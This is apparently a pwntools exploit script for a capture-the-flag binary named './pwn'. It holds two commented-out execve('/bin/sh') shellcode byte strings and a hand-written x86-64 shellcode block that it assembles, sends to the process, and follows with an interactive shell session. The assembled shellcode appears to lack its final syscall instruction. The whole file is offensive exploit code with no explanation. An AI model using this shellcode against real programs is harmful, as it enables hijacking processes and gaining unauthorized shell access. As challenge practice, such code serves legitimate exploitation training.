from pwn import *

p = process('./pwn')
context(os='linux', arch='amd64')
# payload = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
# payload = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
# gdb.attach(p)
# pause()
# p.sendline(payload)
shellcode = """
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al,59
"""
payload = asm(shellcode)
print(len(payload))
gdb.attach(p)
pause()
p.sendline(payload)
p.interactive()